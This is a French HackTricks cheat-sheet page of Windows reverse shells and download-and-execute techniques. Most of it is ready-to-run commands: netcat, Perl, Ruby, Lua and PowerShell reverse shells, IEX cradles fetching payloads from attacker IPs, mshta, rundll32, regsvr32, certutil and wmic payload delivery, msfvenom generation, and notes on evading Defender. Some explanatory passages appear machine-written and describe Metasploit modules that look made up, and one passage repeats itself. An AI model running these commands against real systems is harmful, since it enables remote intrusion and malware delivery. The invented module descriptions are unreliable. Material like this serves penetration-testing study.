# Shells - Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de cybersécurité ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

🐞 Lisez les tutoriels sur les bugs web3

🔔 Recevez des notifications sur les nouveaux programmes de primes pour bugs

💬 Participez aux discussions de la communauté

## Lolbas

La page [lolbas-project.github.io](https://lolbas-project.github.io/) est pour Windows ce que [https://gtfobins.github.io/](https://gtfobins.github.io/) est pour Linux.\
Évidemment, **il n'y a pas de fichiers SUID ou de privilèges sudo sous Windows**, mais il est utile de savoir **comment** certains **binaires** peuvent être (mal)utilisés pour effectuer des actions inattendues comme **exécuter du code arbitraire.**

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd** est un clone de Netcat, conçu pour être portable et offrir un cryptage fort. Il fonctionne sur des systèmes d'exploitation de type Unix et sur Microsoft Win32. sbd prend en charge le cryptage AES-CBC-128 + HMAC-SHA1 (par Christophe Devine), l'exécution de programmes (option -e), le choix du port source, la reconnexion continue avec délai et quelques autres fonctionnalités intéressantes. sbd ne prend en charge que la communication TCP/IP. sbd.exe (faisant partie de la distribution Kali Linux : /usr/share/windows-resources/sbd/sbd.exe) peut être téléchargé sur une machine Windows en tant qu'alternative à Netcat.
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl est un langage de programmation interprété, souvent utilisé pour l'automatisation de tâches système et la manipulation de fichiers. Il est également utilisé dans le développement web pour la création de scripts CGI. Perl est souvent utilisé dans les outils de hacking en raison de sa flexibilité et de sa capacité à manipuler des données de manière efficace.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby est un langage de programmation interprété et orienté objet. Il est souvent utilisé pour le développement web et est également populaire dans le domaine de la sécurité informatique en raison de sa flexibilité et de sa facilité d'utilisation. Ruby est souvent utilisé pour écrire des scripts de hacking en raison de sa syntaxe concise et de sa capacité à manipuler facilement les chaînes de caractères.
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua est un langage de programmation léger, rapide et facile à apprendre. Il est souvent utilisé pour l'écriture de scripts et d'extensions dans des applications plus grandes. Lua est également utilisé dans des jeux vidéo populaires tels que World of Warcraft et Angry Birds. Lua est souvent intégré à des applications en tant que langage de script pour permettre aux utilisateurs de personnaliser et d'étendre les fonctionnalités de l'application.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Attaquant (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Victime
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershell est un interpréteur de commandes et un langage de script développé par Microsoft pour les systèmes Windows. Il est basé sur le framework .NET et permet d'automatiser des tâches administratives, de gérer des configurations système et de manipuler des données.

### Exécution de scripts Powershell

Pour exécuter un script Powershell, il suffit de lancer l'interpréteur de commandes Powershell et de spécifier le chemin vers le script à exécuter. Par exemple :

```
powershell.exe -ExecutionPolicy Bypass -File C:\chemin\vers\script.ps1
```

L'option `-ExecutionPolicy Bypass` permet de contourner la politique de sécurité de Powershell qui empêche l'exécution de scripts non signés ou provenant de sources non fiables.

### Utilisation de l'API .NET depuis Powershell

Powershell permet d'accéder à toutes les fonctionnalités de l'API .NET, ce qui offre une grande flexibilité pour la manipulation de données et la création d'outils personnalisés. Par exemple, pour utiliser la classe `System.Net.WebClient` pour télécharger un fichier depuis une URL :

```
$client = New-Object System.Net.WebClient
$client.DownloadFile("http://example.com/file.txt", "C:\chemin\vers\file.txt")
```

### Utilisation de Powershell pour l'attaque

Powershell est un outil très puissant pour l'attaque car il permet d'exécuter des commandes à distance, de manipuler des fichiers et des données, et d'interagir avec des API. Il est souvent utilisé pour lancer des attaques de type "fileless" qui ne laissent pas de traces sur le disque dur de la victime.

### Utilisation de Powershell pour la défense

Powershell peut également être utilisé pour la défense en automatisant des tâches de surveillance et de détection d'activités suspectes. Par exemple, en surveillant les événements de création de processus Powershell ou en détectant l'utilisation de commandes Powershell malveillantes.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Processus effectuant un appel réseau : **powershell.exe**\
Charge utile écrite sur le disque : **NON** (_du moins nulle part où j'ai pu trouver en utilisant procmon !_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Processus effectuant un appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **Cache local du client WebDAV**

**Ligne unique :**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Obtenez plus d'informations sur les différentes Shells Powershell à la fin de ce document**

## Mshta
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
Processus effectuant un appel réseau : **mshta.exe**\
Charge utile écrite sur le disque : **cache local d'IE**
```bash
mshta http://webserver/payload.hta
```
Processus effectuant un appel réseau : **mshta.exe**\
Charge utile écrite sur le disque : **cache local d'IE**
```bash
mshta \\webdavserver\folder\payload.hta
```
Processus effectuant un appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **Cache local du client WebDAV**

#### **Exemple de shell inversé hta-psh (utilisation d'hta pour télécharger et exécuter une porte dérobée PS)**
```markup
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Vous pouvez télécharger et exécuter très facilement un zombie Koadic en utilisant le stager hta**

#### Exemple hta
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
        var c = "cmd.exe /c calc.exe"; 
        new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

La technique `mshta - sct` est une méthode courante pour exécuter du code arbitraire sur une machine Windows. Elle consiste à utiliser `mshta.exe` pour exécuter un fichier `.sct` (Scriptlet Text) qui contient du code VBScript ou JScript. Le fichier `.sct` est généralement hébergé sur un serveur distant et téléchargé sur la machine cible via une requête HTTP.

Voici un exemple de commande pour exécuter un fichier `.sct` à distance:

```
mshta.exe http://<attacker_ip>/file.sct
```

Il est important de noter que cette technique peut être détectée par les solutions de sécurité modernes, car elle est souvent utilisée dans des attaques de phishing et de malvertising.
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

#### Mshta - Metasploit

Mshta is a Microsoft utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta and are treated as HTML files but executed as applications. Mshta.exe is installed by default on Windows systems.

Metasploit has a module that allows you to execute an HTA file on a target system using Mshta. The module is called `exploit/windows/browser/mshta\_hta`.

##### Usage

```
msf > use exploit/windows/browser/mshta_hta
msf exploit(mshta_hta) > set payload windows/meterpreter/reverse_tcp
msf exploit(mshta_hta) > set lhost <attacker IP>
msf exploit(mshta_hta) > set srvhost <attacker IP>
msf exploit(mshta_hta) > set uripath /payload.hta
msf exploit(mshta_hta) > exploit
```

This will create a web server on the attacker's machine and serve the HTA file. When the target system executes the HTA file, a Meterpreter session will be created on the attacker's machine.

##### Mshta - HTA - PowerShell

Mshta can also be used to execute PowerShell commands on a target system. This can be done by embedding the PowerShell commands in an HTA file and executing it using Mshta.

```
mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/Arno0x/PowerShellScripts/master/Invoke-Mimikatz.ps1");close(Execute(a))
```

This command will download the Invoke-Mimikatz PowerShell script from GitHub and execute it on the target system.

##### Mshta - HTA - JavaScript

Mshta can also be used to execute JavaScript on a target system. This can be done by embedding the JavaScript code in an HTA file and executing it using Mshta.

```
mshta.exe javascript:alert("Hello, world!");
```

This command will display an alert box with the message "Hello, world!" on the target system.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Détecté par Defender**

## **Rundll32**

[**Exemple de Dll hello world**](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
Processus effectuant un appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **Cache local du client WebDAV**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
Processus effectuant un appel réseau : **rundll32.exe**\
Charge utile écrite sur le disque : **cache local d'IE**

**Détecté par Defender**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

Le module Metasploit `windows/local/metinject` permet d'injecter un payload dans un processus distant en utilisant la commande `rundll32.exe`. 

Le payload est injecté dans la mémoire du processus cible en utilisant la fonction `LoadLibrary` de `rundll32.exe`. 

Le module `windows/local/metinject` peut être utilisé pour injecter un payload dans un processus distant en utilisant la commande `rundll32.exe`. 

Le payload est injecté dans la mémoire du processus cible en utilisant la fonction `LoadLibrary` de `rundll32.exe`.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

La technique Rundll32 est souvent utilisée pour exécuter des commandes malveillantes sur des systèmes Windows. Koadic est un outil de post-exploitation qui permet aux attaquants d'exécuter des commandes à distance sur des systèmes Windows compromis. En utilisant Rundll32 pour exécuter Koadic, les attaquants peuvent contourner les défenses de sécurité en utilisant un processus légitime de Windows pour exécuter des commandes malveillantes.

Pour utiliser cette technique, les attaquants doivent d'abord charger le module Koadic dans la mémoire du système compromis. Ensuite, ils peuvent utiliser la commande Rundll32 pour exécuter le module Koadic en utilisant la syntaxe suivante :

```
Rundll32.exe <path_to_koadic_dll>,<function_name> <arguments>
```

Le chemin d'accès au module Koadic DLL doit être spécifié, ainsi que le nom de la fonction à exécuter et les arguments à passer à cette fonction. Les attaquants peuvent utiliser cette technique pour exécuter des commandes malveillantes telles que la création d'un shell inversé ou la collecte d'informations sur le système compromis.

Il est important de noter que cette technique peut être détectée par les outils de sécurité qui surveillent les commandes Rundll32. Les défenses de sécurité peuvent être renforcées en désactivant l'exécution de Rundll32 à partir de répertoires non systèmes ou en surveillant les appels Rundll32 pour détecter les comportements malveillants.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

Regsvr32 est un outil de ligne de commande qui permet d'enregistrer et de supprimer des entrées de registre pour les bibliothèques de liens dynamiques (DLL) et les contrôles ActiveX dans Windows. Il peut également être utilisé pour exécuter du code malveillant sur une machine cible en enregistrant une DLL malveillante et en la chargeant dans le contexte d'un processus légitime. Cette technique est souvent utilisée dans les attaques de type "fileless" car elle ne nécessite pas de fichier exécutable sur le disque.
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
Processus effectuant un appel réseau : **regsvr32.exe**\
Charge utile écrite sur le disque : **cache local d'IE**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
Processus effectuant un appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **Cache local du client WebDAV**

**Détecté par Defender**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration 
    progid="PoC"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
    <script language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("calc.exe");    
        ]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

#### Regsvr32 - Metasploit

La technique Regsvr32 est souvent utilisée pour exécuter du code malveillant sur une machine Windows. Metasploit propose un module pour exploiter cette technique.

##### Utilisation

```
use exploit/windows/local/regsvr32
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your IP>
set LPORT <your port>
set RHOST <target IP>
set RPORT <target port>
set REGSVR32_PATH <path to regsvr32.exe on target>
set REGSVR32_ARGS <arguments to pass to regsvr32.exe>
set DLL_URL <URL to the DLL to download>
set DLL_NAME <name of the DLL to download>
set DLL_PATH <path to the DLL on target>
set TARGET <target architecture (x86 or x64)>
run
```

##### Exemple

```
use exploit/windows/local/regsvr32
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set RHOST 192.168.1.20
set RPORT 445
set REGSVR32_PATH C:\Windows\System32\regsvr32.exe
set REGSVR32_ARGS /s /u /i
set DLL_URL http://192.168.1.10:8000/evil.dll
set DLL_NAME evil.dll
set DLL_PATH C:\Windows\Temp\evil.dll
set TARGET x64
run
```

##### Explication

Ce module utilise la technique Regsvr32 pour télécharger et exécuter un fichier DLL malveillant sur la machine cible. Le fichier DLL est téléchargé depuis une URL spécifiée et enregistré dans un emplacement temporaire sur la machine cible. Ensuite, Regsvr32 est utilisé pour exécuter le fichier DLL malveillant. Le module prend en charge les architectures x86 et x64.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Vous pouvez télécharger et exécuter très facilement un zombie Koadic en utilisant le stager regsvr**

## Certutil

Téléchargez un fichier B64dll, décodez-le et exécutez-le.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Téléchargez un fichier B64exe, décodez-le et exécutez-le.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Détecté par Defender**

***

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

🐞 Lisez les tutoriels sur les bugs web3

🔔 Recevez des notifications sur les nouveaux programmes de primes pour bugs

💬 Participez aux discussions de la communauté

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Le module `exploit/windows/local/cscript` de Metasploit permet d'exécuter du code arbitraire en tant qu'utilisateur SYSTEM en utilisant le binaire `cscript.exe` de Windows. Ce module exploite une vulnérabilité de DLL hijacking dans `cscript.exe` pour charger une DLL malveillante et exécuter du code arbitraire. 

Pour utiliser ce module, il suffit de configurer les options `SESSION` et `PAYLOAD`, puis de lancer l'exploit. Une fois l'exploit réussi, l'utilisateur SYSTEM sera créé et un shell sera ouvert. 

Il est important de noter que ce module ne fonctionne que sur les versions de Windows antérieures à Windows 10.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
## Détecté par Defender

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Processus effectuant un appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **Cache local du client WebDAV**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
## **Détecté par Defender**

## **MSIExec**

Défenseur
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Victime:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Détecté**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
Processus effectuant un appel réseau: **wmic.exe**\
Charge utile écrite sur le disque: **cache local d'IE**

Exemple de fichier xsl:
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
        ]]>
    </ms:script>
</stylesheet>
```
Extrait de [ici](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

**Non détecté**

**Vous pouvez télécharger et exécuter très facilement un zombie Koadic en utilisant le stager wmic**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Processus effectuant un appel réseau: **svchost.exe**\
Charge utile écrite sur le disque: **Cache local du client WebDAV**

Vous pouvez utiliser cette technique pour contourner la liste blanche d'applications et les restrictions de Powershell.exe. Vous serez invité avec un shell PS.\
Téléchargez simplement ceci et exécutez-le: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Non détecté**

## **CSC**

Compiler du code C# sur la machine victime.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Vous pouvez télécharger un shell inversé C# de base à partir d'ici: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Non détecté**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
Processus effectuant un appel réseau: **svchost.exe**\
Charge utile écrite sur le disque: **Cache local du client WebDAV**

**Je ne l'ai pas essayé**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
Processus effectuant un appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **cache local du client WebDAV**

**Je ne l'ai pas essayé**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Shells Powershell

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

Dans le dossier **Shells**, il y a beaucoup de shells différents. Pour télécharger et exécuter Invoke-_PowerShellTcp.ps1_, faites une copie du script et ajoutez à la fin du fichier :
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Commencez à servir le script sur un serveur web et exécutez-le sur l'ordinateur de la victime :
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender ne le détecte pas comme un code malveillant (pour l'instant, 3/04/2019).

**TODO: Vérifier les autres shells de nishang**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Téléchargez, démarrez un serveur web, démarrez l'écouteur et exécutez-le sur l'ordinateur de la victime :
```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender ne le détecte pas comme un code malveillant (pour l'instant, 3/04/2019).

**Autres options offertes par powercat:**

Lier des shells, Shell inversé (TCP, UDP, DNS), Redirection de port, téléchargement/téléversement, Générer des charges utiles, Servir des fichiers...
```
Serve a cmd Shell:
    powercat -l -p 443 -e cmd
Send a cmd Shell:
    powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
    powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
    powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
    powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
    powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
    powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Créez un lanceur PowerShell, enregistrez-le dans un fichier, téléchargez-le et exécutez-le.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Détecté comme code malveillant**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Créez une version PowerShell de la porte dérobée Metasploit en utilisant Unicorn.
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Démarrez msfconsole avec la ressource créée:
```
msfconsole -r unicorn.rc
```
Démarrez un serveur web servant le fichier _powershell\_attack.txt_ et exécutez sur la victime:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
## Détecté comme code malveillant

## Plus

[PS>Attack](https://github.com/jaredhaight/PSAttack) Console PS avec quelques modules PS offensifs préchargés (chiffrés)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS avec quelques modules PS offensifs et détection de proxy (IEX)

## Bibliographie

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

🐞 Lisez les tutoriels sur les bugs web3

🔔 Soyez informé des nouveaux programmes de primes pour bugs

💬 Participez aux discussions de la communauté

<details>

